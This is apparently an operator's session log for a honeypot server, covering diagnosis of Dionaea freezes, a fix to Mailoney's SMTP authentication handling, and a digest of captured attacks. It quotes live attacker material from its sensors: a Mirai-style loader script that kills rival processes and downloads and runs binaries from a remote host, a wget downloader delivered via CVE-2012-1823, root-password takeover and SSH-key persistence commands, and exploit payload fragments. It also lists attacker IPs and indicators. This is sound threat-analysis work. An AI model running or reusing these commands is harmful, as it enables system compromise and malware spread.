# SESSION 38 — Third Freeze, First Auto-Recovery, and Mailoney Finally Captures Something

**Date:** 2026-09-22
**Box:** Hetzner Cloud VPS `ubuntu-4gb-hel1-2` (62.238.47.215)
**Thread:** honeypot VPS
**Continuity:** Follows `SESSION-37-dionaea-recurrence-and-corrections-2026-09-22.md`.

**Summary.** Dionaea froze a third time and the watchdog recovered it automatically in
under 40 minutes — its first real save. The freeze also disproved another piece of the
session-37 write-up: the SIP Cleanup storm is not part of the failure signature.
Native stack-dump tooling was added so the next freeze records where the process is
actually stuck. Separately, a full four-sensor pull found mailoney had been advertising
an authentication method it never implemented, which is why its credentials table has
been empty since session 30. Fixed and verified.

---

## 1. Third freeze — the watchdog worked

```text
DIONAEA AUTO-RESTARTED
process had started: 2026-09-22T13:17:21.787282143Z
CPU before: 100.3%  after: 0.01%
evidence: /root/dionaea-postmortem-20260922-202002-auto
```

Reconstructed from `meta.txt` (`db_age_h=0.6191763679848777`, restart at 20:20:02):

| | |
|---|---|
| Process started | 2026-09-22 13:17:21 |
| Froze | 2026-09-22 19:42:52 |
| **Uptime** | **6.43 hours** |
| Auto-restarted | 2026-09-22 20:20:02 |
| Outage | ~37 minutes |

Against 94 hours for incident 1 and 24 hours for incident 2. The combined-signature
rule (high CPU on two consecutive runs **and** database quiet 30+ minutes) fired
correctly, preserved evidence, restarted, and reported — with no human involved.

---

## 2. The Cleanup storm is not part of the signature

Session 37 listed "a burst of SIP Cleanup warnings stamped at the freeze second" as an
established signal. This freeze produced none.

```bash
grep -c "22092026 19:4" "$D/dionaea-errors.log"     # 11
```

Eleven lines in the four minutes around the freeze, all ordinary:

```text
[22092026 19:40:32] connection /code/src/connection.c:137-warning: getpeername failed (Transport endpoint is not connected)
[22092026 19:40:32] connection /code/src/connection_tcp.c:97-warning: accepting connection failed, closing connection
[22092026 19:40:37] connection /code/src/connection_tcp.c:271-warning: recv failed size -1 recv_size 1 (Connection reset by peer)
[22092026 19:40:45] MSSQL /dionaea/mssql/mssql.py:44-warning: Incomplete TDS_Header
```

The 712-line block still present in the file is dated `[21092026 12:29:52]` — incident
2's storm, which had not yet rotated out.

**Correction to something said in-session.** On seeing that, the immediate read was
that session 37's "712 both times" had been one storm counted twice. That was wrong.
Incident 1's storm is stamped `16092026 13:36:53` and incident 2's `21092026 12:29:52`
— two genuinely separate storms of near-identical size, exactly as session 37
described. The duplicate was only between the two *incident-2* snapshots
(`20260922-124507` and the `131720-auto` test copy), which are the same live file
captured 32 minutes apart.

So the accurate position is narrower than either claim:

- Incidents 1 and 2 each produced a ~712-line Cleanup burst filling exactly 49,152
  bytes (12 × 4 KiB) — the repeated size across two independent events is still
  unexplained
- **Incident 3 produced no burst at all**
- Therefore the storm is **correlated with some freezes, not required for one**

---

## 3. Two more hypotheses eliminated

### 3.1 Uptime pattern — dead

```text
incident 1   17.9 h
incident 2   24.5 h
incident 3    6.4 h
```

Session 37 offered "within about a day" on two points. The third breaks it, and the
trend is downward. Either something degrades across restarts, or runtime is not the
variable.

### 3.2 Load dependence — dead

Traffic in the 30 minutes before freeze 3:

```text
smbd 23 (4 hosts) · epmapper 14 · mssqld 12 · SipSession 12 (5 hosts)
mqttd 10 · SipCall 4 · pptpd 3 · httpd 2 · Memcache 1
```

81 connections across nine protocols, no dominant source. Top talkers were the routine
`45.79.x` / `45.33.x` scanner ranges at 10-13 connections each. Compare incident 1,
where `82.165.65.238` alone had sent 5,970 SIP connections in 20 hours.

**Dionaea froze under ordinary load, after the shortest uptime yet.** That removes the
last external explanation.

Running total of disproven mechanisms: SIP flood (s37), timer-thread accumulation
(s37), Cleanup storm as cause (s37), Cleanup storm as signature (here), uptime pattern
(here), load dependence (here).

---

## 4. Native stack tooling — the evidence that was missing

Everything so far has been observed from outside the process. That is why each
explanation fit and then failed.

### 4.1 py-spy, and a correction to how its output was read

```bash
pip install py-spy --break-system-packages
py-spy dump --pid $(docker inspect -f '{{.State.Pid}}' dionaea)
```

```text
Process 126005: /opt/dionaea/bin/dionaea …
Python v3.6.9 (/opt/dionaea/bin/dionaea)

Thread 0x74D9C2B34740 (active): "MainThread"
Thread 0x74D9B69B2700 (idle): "Thread-1"
    wait (threading.py:299)
    …
```

The MainThread shows `(active)` with **no Python frames**. That was read in-session as
"spinning in C." The gdb output (§4.2) shows the real meaning: the MainThread is
Dionaea's C event loop and never runs Python, so py-spy has no frames to show for it —
whether it is spinning or idle. This capture was taken on a *healthy* process, so the
inference happened to point the right way for the wrong reason.

### 4.2 gdb — and the healthy baseline that matters

```bash
apt-get install -y gdb
timeout 60 gdb -p $PID -batch -ex "thread apply all bt"
```

The first line, on a healthy process:

```text
0x000074d9c15c2a47 in epoll_wait () from target:/lib/x86_64-linux-gnu/libc.so.6
```

**The main thread parked in `epoll_wait`** — the event loop asleep waiting for
network activity. Correct for an idle honeypot.

That single line is the baseline the next freeze will be compared against. Whatever
replaces `epoll_wait` at the top of a pinned process names the loop.

The Python thread's stack confirms normal operation:

```text
Thread 4 (LWP 126352 "dionaea"):
#0  do_futex_wait ()
#2  PyThread_acquire_lock_timed ()      <- waiting for the GIL
#7  _PyEval_EvalFrameDefault ()
…
Thread 3 (LWP 126353 "pool"):
#1  g_cond_wait () from libglib-2.0.so.0
```

gdb warns about a PID-namespace mismatch and missing symbols for Dionaea's own
libraries (`curl.so`), so in-project function names may render as `??`. Frame
addresses still resolve and the top frame is the part that matters.

### 4.3 Wired into the watchdog

Both dumps now run **before** the restart, so they capture the frozen process:

```python
open(f"{d}/threads.txt", "w").write(sh("ps", "-Lp", pid, "-o", "pid,tid,pcpu,stat,wchan:32,comm"))
open(f"{d}/pyspy.txt",   "w").write(sh("py-spy", "dump", "--pid", pid, t=60) or "(py-spy failed)")
open(f"{d}/gdb-bt.txt",  "w").write(
    sh("timeout", "60", "gdb", "-p", pid, "-batch", "-ex", "thread apply all bt", t=90)
    or "(gdb failed)")
open(f"{d}/meta.txt",    "w").write(f"started_at={started}\ncpu={cpu}\ndb_age_h={db_age_h}\n")
sh("docker", "restart", "dionaea", t=120)
```

Verified by line number (66-72) that both writes precede the restart call. Adds roughly
30-60 seconds to recovery time.

---

## 5. Mailoney — three weeks of capturing nothing, explained and fixed

### 5.1 The actor

`91.92.241.9` accounts for 1,205 of 1,455 real-source SMTP sessions since 2026-09-16,
every one opening:

```text
ehlo ylmf-pc
auth login
```

`ylmf-pc` is a long-documented signature. Mail administrators have reported it for
years as a brute-force SMTP authentication guessing botnet that connects, examines the
EHLO response to see whether authentication is advertised, and repeats the cycle very
fast — often multiple connects per second from one host.

### 5.2 The bug

```bash
python3 …   # what follows every AUTH attempt, across all sessions
```

```text
1271  'auth login'                -> '502 5.5.2 Error: command not recognized'
   3  'auth ntlm'                 -> '502 5.5.2 Error: command not recognized'
   1  'auth ntlm tlrmtvntuaabaaa' -> '502 5.5.2 Error: command not recognized'
```

The source explains it in two lines:

```python
 81:   250-AUTH LOGIN PLAIN                        # advertises LOGIN and PLAIN
216:   request = client_socket.recv(4096).decode().strip().lower()
230:   elif request.startswith('auth plain'):      # only implements PLAIN
```

**Three defects:**

1. **Advertises `AUTH LOGIN`, implements only `AUTH PLAIN`.** Bots overwhelmingly use
   LOGIN, so every attempt died at the first step. This is why the credentials table
   had zero rows.
2. **Lowercases every received line.** SMTP credentials are base64, which is
   case-sensitive — so even the PLAIN path would have stored corrupted data. This also
   explains the mangled `tlrmtvntuaab…` NTLM blob in session 32, which should read
   `TlRMTVNTUAAB…`.
3. **Replies `235 2.7.0 Authentication failed`.** In SMTP, 235 is the *success* code.
   Bots read the number, not the text.

A fourth, found in the same pass: the EHLO advertises `PIPELINING`, but the handler
processes one command per `recv()`. A pipelining client's commands are silently
dropped.

### 5.3 The fix

```python
# keep the raw line; lowercase only for command matching
raw = client_socket.recv(4096).decode(errors="replace").strip()
request = raw.lower()

# implement AUTH LOGIN (RFC 4954): 334 base64('Username:') then 334 base64('Password:')
elif request.startswith('auth login'):
    parts = raw.split()
    creds = parts[2:3]                      # optional inline initial response
    for prompt in ('VXNlcm5hbWU6', 'UGFzc3dvcmQ6')[len(creds):]:
        client_socket.send(('334 ' + prompt + '\n').encode())
        line = client_socket.recv(4096).decode(errors="replace").strip()
        if not line: break
        creds.append(line)
    if creds:
        log_credential(session_record.id, ' '.join(creds))
```

Session logging now records `raw` rather than the lowercased copy. `PIPELINING` removed
from the EHLO response — matching the advertisement to the implementation, which is the
same class of fix.

**Staged response**, to get both credentials and message bodies:

```python
_seen[_ip] = _seen.get(_ip, 0) + 1
if _seen[_ip] > 5:
    response = "235 2.7.0 Authentication successful\n"    # now they proceed to MAIL/DATA
else:
    response = "535 5.7.8 Authentication credentials invalid\n"   # keep feeding the wordlist
```

First five attempts from an IP are rejected so the bot cycles its wordlist; the sixth
is accepted so it proceeds to `MAIL FROM` / `DATA` and the message is captured.
Mailoney never delivers anything, so nothing leaves the IP.

Implementation note: the counter is a module-level dict keyed by IP. It resets on
service restart and never expires entries — acceptable at this traffic level, but it
means returning bots get five fresh rejections after any restart.

### 5.4 Verified, not assumed

```text
334 VXNlcm5hbWU6
334 UGFzc3dvcmQ6
535 5.7.8 Authentication credentials invalid
(1, 2047, 'dGVzdHVzZXI= cGFzc3dvcmQxMjM=') -> ['testuser', 'password123']
```

Staging, across six attempts from one IP:

```text
attempt 1-5: 535 5.7.8 Authentication credentials invalid
attempt 6:   235 2.7.0 Authentication successful
250 2.1.0 OK  /  354 End data…  /  250 2.0.0 Ok
```

And the body landed on disk. Test rows appear as `127.0.0.1` and must be excluded from
analysis.

### 5.5 What was already there: open-relay probes

The four existing `.eml` files each contain exactly one word — `QUIT`. The sequence
explains it: the bot sends `MAIL FROM` / `RCPT TO` / `DATA`, mailoney answers `354 End
data`, and **that 354 is the answer the bot wanted** — proof the server will relay for
anyone. It disconnects immediately, and mailoney (still in body-receive mode) saves the
`QUIT` as the message.

The envelopes are the valuable part:

```text
2026-09-18 06:21  172.96.181.191    dpr@priv8shop.com  -> kingebonic2019@yahoo.com
2026-09-18 11:50  81.90.29.7        accounts@globalfinancesolutions.com -> iykejesse9994@hotmail.com
2026-09-20 20:20  196.251.121.140   dpr@priv8shop.com  -> mrsaminelkar@aol.com
2026-09-21 12:32  196.251.121.140   dpr@priv8shop.com  -> peterpannn80@yahoo.com
```

**`dpr@priv8shop.com` appears from two different source IPs three days apart** — one
toolkit or one operator. Recipients are free webmail, which in a relay test are usually
mailboxes the tester controls; treat them as probable operator drop-boxes rather than
confirmed. `196.251.121.140` here and `196.251.121.220` (mailoney's #2 source) share a
/24.

---

## 6. Full sensor pull — 2026-09-16 19:00 onward

### 6.1 Cowrie

```text
events/day:  09-17 11,775 · 09-18 11,774 · 09-19 13,860 · 09-20 7,500 · 09-21 7,641
unique IPs 1,087   first seen this window 864 (79%)
recon-only 679 · ran commands 266 · dropped payloads 118
protocol: ssh 35,316 · telnet 21,807
```

**Caveat on the 118.** Cowrie logs redirected shell output (`echo … > file`) as a
`file_download`, so the dropper count includes bots that only tested whether a
directory was writable (§6.3). The real figure is lower and should be recomputed by
filtering events that carry a `url`.

### 6.2 New infrastructure

| Indicator | Notes |
|---|---|
| `58.211.144.243:800` | New loader host, 15 architectures |
| `217.60.195.113` | New — `wget --no-check-certificate -qO- https://217.60.195.113/sh` via CVE-2012-1823 on the web honeypot |
| `176.65.139.196` | Serving `kla.sh` — same loader filename as `160.119.66.206` |
| `160.119.66.206` | Still serving `kla.sh` / `net.*`, a week after session 32 |
| `100.76.58.42:46898` | Loader callback inside `100.64.0.0/10` (carrier-grade NAT) — non-routable, so the fetch cannot succeed. The loader is running behind a mobile/CGNAT connection and advertising its internal address |

### 6.3 The `58.211.144.243` loader — and a correction to session 27

**[SAMPLE — excerpt, do not run]**

```sh
for i in 1 2 3; do
    while IFS= read -r line; do
        set -- $line ; mp=$2 ; ft=$3
        case $mp in /proc/[0-9]*/|/proc/[0-9]*)
            [ "$ft" != "proc" ] && { pid=${mp#/proc/}; pid=${pid%%/*}
                umount -l "$mp" 2>/dev/null ; kill -9 "$pid" 2>/dev/null ; }
        esac
    done < /proc/mounts
done
for pid in /proc/[0-9]*; do
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    case $exe in /tmp/*) kill -9 "$pid" 2>/dev/null ;; esac
done
for bin in $bins; do
    cd /tmp || cd /var/run || … ; wget http://${server}/${bin} ; chmod 777 ${bin}
    ./${bin} ${group}.${bin} ; rm -rf ${bin}
done
```

The first loop is the notable part: it reads `/proc/mounts` looking for anything
mounted **over** a `/proc/<pid>` directory. That is a known process-hiding technique —
bind-mount an empty directory over a process's `/proc` entry so `ps` cannot see it.
This script unmounts those and kills whatever was hiding underneath. More sophisticated
rival-eviction than the `/proc/*/exe (deleted)` killers in session 30.

**Session 27 concluded Cowrie cannot interpret scripts. It partly can.** The evidence:

- Cowrie expanded `${server}` and executed the `for bin in $bins` loop
- It did **not** word-split `$bins`, so the loop ran once with the entire
  architecture list as a single value
- The resulting request was `http://58.211.144.243:800/arc armv6l i586 mips …`
- The server returned a genuine Apache 404 page, saved as a 286-byte "payload"
- Cowrie then executed that HTML, which is why `<!DOCTYPE HTML PUBLIC …>` appears six
  times in the command list

So Cowrie handles variables and loops but gets word-splitting wrong — a bug and a
honeypot tell, since a real shell never requests a URL containing spaces. Whatever
stopped session 27's loader was more specific than "cannot run scripts."

### 6.4 Six bots running the same kit

```text
102.207.180.32   {'(redirect) 01ba4719c80b': 11}   first cmds: enable / system / shell
180.243.6.83     {'(redirect) 01ba4719c80b': 11}   …
5.129.182.164    {'(redirect) 01ba4719c80b': 11}
58.72.124.213    {'(redirect) 01ba4719c80b': 11}
69.117.41.89     {'(redirect) 01ba4719c80b': 11}
85.74.220.101    {'(redirect) 01ba4719c80b': 11}
```

The written file is **1 byte**. Session 32 documented a probe running
`/bin/busybox echo > /tmp/.b && sh /tmp/.b && cd /tmp/` across **11 directories** — an
`echo` with no argument writes a single newline. Eleven directories, eleven one-byte
files, identical on six hosts: the same malware, newly spread.

`128.199.145.5` differs — 18 writes of `a8460f446be5` after
`chattr -ia .ssh; lockr -ia .ssh`, the SSH-key persistence pattern already in the
corpus.

### 6.5 Mirai loader fingerprints, new this window

```text
/bin/busybox 3QMJFQr9              # random applet name — real busybox: "applet not found"
/bin/busybox HtjCQRH7
/bin/busybox MIRAI
/bin/busybox echo -ne '\xdd\x00'; echo -ne '\x55\xaa'    # binary-safe echo check
echo "root:olvuUCX1VGPK"|chpasswd|bash                   # root password takeover
uname -a ; echo 'vT'                                     # output delimiter
```

The random-applet calls double as honeypot detection — worth checking what Cowrie
answers, since a wrong reply gives the sensor away.

Also observed: usernames (`admin`, `guest`, `support`, `administrator`) arriving as
shell commands, most likely telnet bots whose login sequence fell out of step with
Cowrie's prompts.

### 6.6 Dionaea captures

| Hash | Size | Identification |
|---|---|---|
| `beb68e9c…` | 82,435 | Miner — contacts **`ca.monerogx.com:8800`** |
| `b6d98153…` | 5,267,459 | WannaCry, kill switch **`…wergwff`** (altered) |
| `e4ac9ef4…` | 5,267,459 | WannaCry, original `…wergwea` |
| `1d43c6c7…` | 5,267,459 | WannaCry, original |
| `26f80464…` | 5,267,459 | WannaCry, original |
| `42ddc5fc…` | 5,267,459 | WannaCry size, **no kill-switch string found** |

**The miner is the same family as session 32's `pan-chan` sample** — also exactly
82,435 bytes, also port 8800, domain rotated from `sm.monerorx.com` to
`ca.monerogx.com`.

**Kill-switch check** (DNS lookup only):

```text
variant  (…wergwff): 77.247.179.90
original (…wergwea): 104.16.166.228  104.16.167.228   (Cloudflare)
```

Both resolve, so both samples still self-terminate on any host with working DNS. That
also explains how a 2017 worm keeps circulating — it survives where DNS is blocked or
broken. Someone has registered the variant domain as well; `whois 77.247.179.90` would
show whether it is another sinkhole.

Shellcode captures remain at 2.

### 6.7 Web honeypot

488 events, 52 IPs, 15 POSTs.

- **`204.76.203.31`** sent three unrelated exploit families in one run: a multipart body
  containing `{"then":"$1:__proto__:then","statu…` — matching the public
  proof-of-concept for **CVE-2025-55182 (React2Shell)** — plus CVE-2017-9841
  (`<?php system('id'); ?>` to PHPUnit paths) and a WordPress REST `/batch/v1` probe.
- **RedTail continues**: `libredtail-http` 125 times from new sources
  (`203.18.158.140`, `106.53.187.237`) with the identical SSH-key staging payload from
  session 32.
- **`31.132.90.3`** used the same CVE-2012-1823 vector with a *different* payload —
  the `217.60.195.113` HTTPS downloader.
- **`94.154.46.244`** made 150 requests as `Googlebot` and has **no reverse DNS**. Real
  Googlebot resolves under `googlebot.com`. Its neighbour `94.154.43.196` is a current
  Cowrie payload dropper.

---

## 7. Files changed

| Path | Change |
|---|---|
| `/opt/honeypot-alerts/heartbeat.py` | Added `py-spy` and `gdb` capture before restart |
| `/home/mailoney/mailoney/mailoney/core.py` | raw-vs-lowercase split; AUTH LOGIN implemented; `535` rejection; staged `235` after 5 attempts; `PIPELINING` removed; raw logged |
| `/root/dionaea-postmortem-20260922-202002-auto/` | **NEW** — first automatic capture |
| Packages | `py-spy` (pip), `gdb` (apt, ~200 MB) |
| Backups | `core.py.bak`, `core.py.bak2` |

---

## 8. Open items

- **The next freeze's `gdb-bt.txt`** is the priority. Compare its top frame against the
  healthy `epoll_wait`. That single line is the likeliest answer after a week of
  external observation.
- **6-hour restart guard vs ~6.4-hour uptime.** A freeze can now land inside the
  lockout window after any restart; the alert fires but recovery is manual. Dropping
  `RESTART_GAP_H` to 3 closes it, at the cost of less protection against a restart loop.
- **Watch mailoney's disk growth.** Every failed attempt stores a row plus a session
  log, and accepted sessions store message bodies. Check
  `du -sh /home/mailoney/mailoney/captured_mail /home/mailoney/mailoney/mailoney.db`.
  This project has already had one disk-full incident.
- **Recompute the dropper count** excluding redirect writes (§6.1).
- **`42ddc5fc`** — WannaCry-sized with no kill-switch string. Either removed or stored
  in a form `strings` cannot see.
- **Captured `.eml` files lose the final newline** — the body writer appears to strip
  the last `\r\n` before the terminator. Cosmetic; confirm with a two-line body.
- **Check Cowrie's reply to `/bin/busybox <random>`** against real busybox's
  `applet not found`.
- Carried: `logrotate` for `/var/log/honeypot-alerts.log`; rotate the Telegram token
  before publishing notes that contain it.

---

## 9. Lessons

- **A watchdog that has recovered something real is worth more than one that has only
  been tested.** 37 minutes versus four days, with no human awake for it.
- **A signature needs more than two samples.** The Cleanup storm looked like part of the
  failure in two incidents and was absent in the third. Two observations of the same
  thing is a coincidence with a plausible story attached.
- **When correcting a correction, re-check the original claim.** The in-session read
  that "712 was one storm counted twice" was itself wrong — the two storms were real,
  and only the third snapshot was a duplicate. Being quick to retract is not the same as
  being right.
- **Get a healthy baseline before you need the broken one.** `epoll_wait` at the top of
  a working process is what makes the next capture interpretable. Collected while
  nothing was wrong, which is the only convenient time.
- **Know what a tool cannot see.** py-spy showed the MainThread with no Python frames;
  that means "this thread doesn't run Python," not "this thread is spinning." gdb showed
  why.
- **Match advertisements to implementations.** Mailoney announced `AUTH LOGIN` and
  `PIPELINING` and supported neither. Both are realism tells, and one of them silently
  discarded three weeks of credential data.
- **Case-sensitive data does not survive a `.lower()`.** Base64 credentials were being
  destroyed on the one code path that did work.
- **Read the response codes, not the response text.** `235 … Authentication failed` is a
  success code carrying a failure message; bots parse the number.
- **A sensor with zero rows in a table is a question, not a fact about the internet.**
  The table was empty because of a bug, not because nobody was trying.
